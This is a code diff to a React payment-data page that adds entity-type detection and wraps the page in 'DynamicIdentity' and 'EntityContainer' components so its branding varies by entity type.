@@ -12,6 +12,8 @@ import { getCurrencySymbol, getCurrencyCode, formatCurrency } from "@/lib/countr
 import PaymentMetaTags from "@/components/PaymentMetaTags";
 import { useLink, useUpdateLink } from "@/hooks/useSupabase";
 import { ArrowLeft, User, Mail, Phone, CreditCard, Hash } from "lucide-react";
+import { DynamicIdentity, EntityHeader, EntityContainer, EntityButton } from "@/components/DynamicIdentity";
+import { getPaymentEntityType } from "@/lib/paymentEntityHelper";
 
 const PaymentData = () => {
   const { id } = useParams();
@@ -45,6 +47,9 @@ const PaymentData = () => {
     [countryCode]
   );
 
+  // Determine entity type
+  const entityType = linkData ? getPaymentEntityType(linkData) : 'government_payment';
+  
   // Get selected government service details
   const selectedServiceData = useMemo(
     () => governmentServices.find(s => s.key === selectedService),
@@ -111,7 +116,8 @@ const PaymentData = () => {
   };
 
   return (
-    <>
+    <DynamicIdentity entityType={entityType}>
+      <EntityContainer entityType={entityType} useBackgroundImage={false}>
       <PaymentMetaTags
         serviceName={serviceName}
         serviceKey={serviceKey}
@@ -286,7 +292,8 @@ const PaymentData = () => {
           </div>
         </div>
       </div>
-    </>
+      </EntityContainer>
+    </DynamicIdentity>
   );
 };
 
